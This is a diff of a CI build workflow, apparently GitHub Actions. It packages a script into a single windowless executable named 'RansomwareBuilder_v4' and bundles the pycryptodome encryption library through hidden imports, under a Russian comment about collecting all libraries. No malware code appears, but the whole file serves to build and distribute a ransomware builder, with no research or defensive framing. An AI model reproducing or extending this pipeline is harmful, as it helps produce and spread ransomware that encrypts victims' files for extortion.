@@ -22,9 +22,18 @@ jobs:
       run: |
         pip install pyinstaller pycryptodome pillow
         
-    - name: Build Builder with PyInstaller embedded
+    - name: Build Builder with ALL dependencies embedded
       run: |
-        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v4" builder.py
+        # СОБИРАЕМ БИЛДЕР СО ВСЕМИ БИБЛИОТЕКАМИ
+        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v4" `
+          --hidden-import PyInstaller `
+          --hidden-import Crypto `
+          --hidden-import Crypto.Cipher `
+          --hidden-import Crypto.PublicKey `
+          --hidden-import Crypto.Util `
+          --collect-all Crypto `
+          --collect-all pycryptodome `
+          builder.py
         
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
